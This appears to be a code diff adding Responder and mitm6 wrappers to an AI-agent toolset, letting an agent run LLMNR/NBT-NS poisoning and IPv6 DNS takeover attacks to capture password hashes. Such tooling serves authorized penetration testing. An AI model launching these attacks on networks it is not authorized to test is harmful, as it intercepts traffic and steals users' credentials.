+        Run Responder to capture LLMNR/NBT-NS/mDNS hashes.
+
+        Args:
+            interface: Network interface to bind to (default: eth0)
+            analyze: Run in analyze (passive) mode (default: False)
+            duration_seconds: How long to run before stopping (default: 600)
+
+        Returns:
+            Responder output and status
+
+        Example:
+            >>> responder(interface="eth0", analyze=False, duration_seconds=900)
+        """
+        cmd = ["responder", "-I", interface]
+        if analyze:
+            cmd.append("-A")
+
+        if duration_seconds > 0:
+            cmd = ["timeout", str(duration_seconds)] + cmd
+
+        try:
+            logger.info(f"[*] Starting Responder on {interface} (analyze={analyze})")
+            timeout_seconds = max(30, duration_seconds + 30)
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=timeout_seconds)
+            output = stdout + "\n" + (stderr or "")
+
+            if returncode == 124:
+                return (
+                    "⏱️ Responder stopped after timeout.\n"
+                    "→ Review captured hashes on the attack box.\n\n" + output
+                )
+            if returncode != 0:
+                return f"[!] Responder exited with code {returncode}\n\n{output}"
+            return "✓ Responder completed.\n\n" + output
+
+        except Exception as e:
+            return f"Responder failed: {e}"
+
+    @dn.tool_method
+    def mitm6(
+        self,
+        interface: str = "eth0",
+        domain: str | None = None,
+        duration_seconds: int = 600,
+    ) -> str:
+        """
+        Run mitm6 to perform IPv6 DNS takeover and capture hashes.
+
+        Args:
+            interface: Network interface to bind to (default: eth0)
+            domain: Target domain to spoof (optional)
+            duration_seconds: How long to run before stopping (default: 600)
+
+        Returns:
+            mitm6 output and status
+
+        Example:
+            >>> mitm6(interface="eth0", domain="corp.local", duration_seconds=900)
+        """
+        cmd = ["mitm6", "-i", interface]
+        if domain:
+            cmd.extend(["-d", domain])
+
+        if duration_seconds > 0:
+            cmd = ["timeout", str(duration_seconds)] + cmd
+
+        try:
+            logger.info(f"[*] Starting mitm6 on {interface} (domain={domain or 'auto'})")
+            timeout_seconds = max(30, duration_seconds + 30)
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=timeout_seconds)
+            output = stdout + "\n" + (stderr or "")
+
+            if returncode == 124:
+                return (
+                    "⏱️ mitm6 stopped after timeout.\n"
+                    "→ Review captured hashes on the attack box.\n\n" + output
+                )
+            if returncode != 0:
+                return f"[!] mitm6 exited with code {returncode}\n\n{output}"
+            return "✓ mitm6 completed.\n\n" + output
+
+        except Exception as e:
+            return f"mitm6 failed: {e}"
 
 
 class MSSQLTools(Toolset):
